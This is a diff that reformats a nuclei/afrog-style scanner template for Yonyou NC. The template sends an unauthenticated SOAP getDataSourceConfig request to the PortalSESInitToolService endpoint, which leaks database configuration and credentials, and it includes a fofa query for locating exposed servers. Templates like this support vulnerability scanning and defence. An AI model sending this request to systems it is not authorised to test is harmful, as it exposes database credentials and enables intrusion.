@@ -1,36 +1,41 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: yonyou-nc-portalsesInittoolservice-disclosure
+
+info:
+  name: 用友 NC PortalSESInitToolService 数据源配置泄露
+  author: zan8in
+  severity: high
+  description: |
+    用友 NC /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService 未授权 getDataSourceConfig，响应含数据源配置（数据库账号等关键情报）。属 NC uapws，不绑定 U8 / YonBIP。
+  reference:
+    - https://github.com/zan8in/afrog
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,nc,disclosure
+
 http:
-  - body: |
-      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
-      <soapenv:Header/>
-      <soapenv:Body>
-          <por:getDataSourceConfig/>
-      </soapenv:Body>
-      </soapenv:Envelope>
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <por:getDataSourceConfig/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
       - type: word
         part: body
         words:
-          - <ns1:getDataSourceConfigResponse
-          - ns1:getDataSourceConfigResponse>
+          - "<ns1:getDataSourceConfigResponse"
+          - "ns1:getDataSourceConfigResponse>"
         condition: and
-    method: POST
-    path:
-      - '{{BaseURL}}/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService'
-id: yonyou-nc-portalsesInittoolservice-disclosure
-info:
-  author: zan8in
-  description: |
-    用友 portalsesInittoolservice 泄露数据库账号密码
-    fofa: app="用友-UFIDA-NC"
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 用友 portalsesInittoolservice 泄露数据库账号密码
-  severity: high
-  tags: yonyou,disclosure,argus-import
+      - type: status
+        status:
+          - 200
